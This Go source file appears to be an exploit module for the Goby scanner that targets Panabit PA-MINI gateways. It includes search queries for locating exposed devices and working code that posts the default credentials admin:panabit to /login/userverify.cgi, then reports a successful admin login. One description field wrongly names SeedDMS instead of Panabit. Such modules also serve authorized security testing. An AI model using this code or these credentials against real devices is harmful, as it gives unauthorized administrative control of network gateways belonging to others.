package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Panabit PA-MINI Gateway userverify.cgi file Default Password Vulnerability",
    "Description": "<p>The PA-MINI series desktop application gateway is a high-performance, high-availability, feature-rich export integrated optimization device specially provided by Panabit for small enterprise networks.Attacker can use the vulnerability to get administrative authority</p>",
    "Impact": "<p>Panabit PA-MINI Gateway Password</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, and the number of digits is greater than 8.</p><p>2. If it is not necessary, it is forbidden to access the system from the public network.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "Product": "Panabit PA-MINI Gateway",
    "VulType": [
        "Default Password"
    ],
    "Tags": [
        "Default Password"
    ],
    "Translation": {
        "CN": {
            "Name": "Panabit PA-MINI 智能网关 userverify.cgi 文件默认口令漏洞",
            "Product": "PA-MINI系列桌面型应用网关",
            "Description": "<p>PA-MINI系列桌面型应用网关是 Panabit 专门为小型企业网络提供的一款高性能、高可用性、功能丰富的出口一体优化设备。</p><p>SeedDMS存在默认口令漏洞。攻击者可利用该漏洞登录后台，获得管理员权限。</p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>PA-MINI系列桌面型应用网关是 Panabit 专门为小型企业网络提供的一款高性能、高可用性、功能丰富的出口一体优化设备。攻击者可利用该漏洞登录后台，获得管理员权限。</p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Panabit PA-MINI Gateway userverify.cgi file Default Password Vulnerability",
            "Product": "Panabit PA-MINI Gateway",
            "Description": "<p>The PA-MINI series desktop application gateway is a high-performance, high-availability, feature-rich export integrated optimization device specially provided by Panabit for small enterprise networks.Attacker can use the vulnerability to get administrative authority</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, and the number of digits is greater than 8.</p><p>2. If it is not necessary, it is forbidden to access the system from the public network.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>Panabit PA-MINI Gateway Password</p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "FofaQuery": "body=\"userverify.cgi\" && cert=\"Organization: Bitbug.net Network Service\" && body=\"Panabit\"",
    "GobyQuery": "body=\"userverify.cgi\" && cert=\"Organization: Bitbug.net Network Service\" && body=\"Panabit\"",
    "Author": "AnMing",
    "Homepage": "https://www.panabit.com/",
    "DisclosureDate": "2022-04-06",
    "References": [
        "https://www.panabit.com/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "username",
            "type": "select",
            "value": "admin",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10489"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			url := "/login/userverify.cgi"
			cfg := httpclient.NewPostRequestConfig(url)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Host", u.HostInfo)
			cfg.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
			cfg.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36")
			cfg.Header.Store("Upgrade-Insecure-Requests", "1")
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=---------------------------2488676342869010711951153348")
			cfg.Header.Store("Referer", u.FixedHostInfo+"/login/login.htm")
			cfg.Header.Store("Origin", u.FixedHostInfo)
			cfg.Header.Store("Accept-Encoding", "gzip, deflate")
			cfg.Header.Store("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2")
			cfg.Header.Store("Sec-Fetch-Dest", "document")
			cfg.Header.Store("Sec-Fetch-Mode", "avigate")
			cfg.Header.Store("Sec-Fetch-Site", "same-origin")
			cfg.Header.Store("Sec-Fetch-User", "?1")
			cfg.Data = "-----------------------------2488676342869010711951153348\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\nadmin\r\n-----------------------------2488676342869010711951153348\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\npanabit\r\n-----------------------------2488676342869010711951153348--"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if strings.Contains(resp.Utf8Html, "<META HTTP-EQUIV=REFRESH CONTENT=\"0;URL=/index.htm\">") && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "urn:schemas-microsoft-com:vml") {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			url := "/login/userverify.cgi"
			cfg := httpclient.NewPostRequestConfig(url)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Host", expResult.HostInfo.HostInfo)
			cfg.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
			cfg.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36")
			cfg.Header.Store("Upgrade-Insecure-Requests", "1")
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=---------------------------2488676342869010711951153348")
			cfg.Header.Store("Referer", expResult.HostInfo.FixedHostInfo+"/login/login.htm")
			cfg.Header.Store("Origin", expResult.HostInfo.FixedHostInfo)
			cfg.Header.Store("Accept-Encoding", "gzip, deflate")
			cfg.Header.Store("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2")
			cfg.Header.Store("Sec-Fetch-Dest", "document")
			cfg.Header.Store("Sec-Fetch-Mode", "avigate")
			cfg.Header.Store("Sec-Fetch-Site", "same-origin")
			cfg.Header.Store("Sec-Fetch-User", "?1")
			cfg.Data = "-----------------------------2488676342869010711951153348\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\nadmin\r\n-----------------------------2488676342869010711951153348\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\npanabit\r\n-----------------------------2488676342869010711951153348--"
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if strings.Contains(resp.Utf8Html, "<META HTTP-EQUIV=REFRESH CONTENT=\"0;URL=/index.htm\">") && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "urn:schemas-microsoft-com:vml") {
					expResult.Success = true
					expResult.Output = "Plase use \"admin:panabit\" to login!"
				}
			}
			return expResult
		},
	))
}
